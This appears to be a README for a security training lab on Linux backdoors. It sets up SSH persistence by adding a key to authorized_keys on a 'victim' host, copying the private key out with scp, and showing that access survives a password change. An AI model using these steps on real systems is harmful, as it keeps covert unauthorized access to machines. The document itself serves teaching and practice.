# Linux Backdoors

This lab setup is meant to simulate a security professional setting up a backdoor in order to maintain access to the compromised system even after the user changed the passwrod.


## Prerequisites

To set up the lab first log in on the victim machine and execute the <code>setup.sh</code> script as sudo using the following command executee in the terminal
```sh
sudo ./setup.sh
```
The purpose of the script is to create a new user and set a default passwrod. To reset the lab and start again the <code>reset.sh</code> script can be used to remove the user, after which the <code>setup.sh</code> script can be executed again.

Victim IP: **192.168.212.151**
Host IP: **192.168.1.132**

<br/>

## Instructions
The lab scenario starts on the attacker machine and all offensive techniques will be carried out from this machine.

1. Log into the victim machine with SSH using the command below. When prompted for password use: **l3tmein**
```sh
ssh web@192.168.212.151
```

2. Now that you managed access the victim machine it's time to set up the ssh backdoor via authorized keys. In the users home directory create the *.ssh* directory using the following command. Note that the . (dot) in front of the directory name means that this is a hidden directory.
```sh
mkdir .ssh
```

3. Next create a file called *authorized_keys* without any extensionu sing the touch command. This file is used to store the public SSH keys coresponding to the users who can access this server using their respective private keys.
```sh
touch .ssh/authorized_keys
```

4. One important aspect that should not be ignored is the restrictive permissions that must be seet for the *.ssh* and *authorized_keys*. This can be done with the <code>chmod</code> command.
```sh
chmod 700 .ssh
chmod 600 .ssh/authorized_keys
```

5. 

```sh
# Generare ssh key pair
ssh-keygen -b 4096 -t rsa
```

6. 
```sh
# Copy the public key in the authorized keys file
cat .ssh/id_rsa.pub >> .ssh/authorized_keys
```


```sh



# retrieve the private key from the server using SCP to the local folder
scp web@192.168.212.151:.ssh/id_rsa .

# attempt a connection with the following command
ssh -i id_rsa web@192.168.212.151

# change the password to: web123
passwd web

# check that you cannot log in
``` 

